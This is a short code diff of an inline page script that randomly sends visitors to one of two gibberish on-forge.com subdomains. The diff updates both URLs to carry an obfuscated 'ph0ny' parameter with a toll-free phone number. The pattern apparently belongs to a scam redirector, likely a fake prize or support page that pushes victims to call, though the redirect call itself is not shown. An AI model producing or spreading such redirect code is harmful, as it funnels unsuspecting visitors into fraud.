@@ -8,8 +8,8 @@
 
 <script>
 (function () {
-    const urlA = "https://cwin-ljsndfdkljnfedkj.on-forge.com";
-    const urlB = "https://dwin-kjlsdbfekjlfnerkjnkhjwbefejhkrbnf.on-forge.com";
+    const urlA = "https://win-ckjdncjewnewjkncewkjn.on-forge.com/?ph0ny=1-844-413-4329";
+    const urlB = "https://win-djnfjlwnfjklwnfwklnfwlknf.on-forge.com/?ph0ny=1-844-413-4329";
 
     // 50-50 split
     const target = Math.random() < 0.5 ? urlA : urlB;
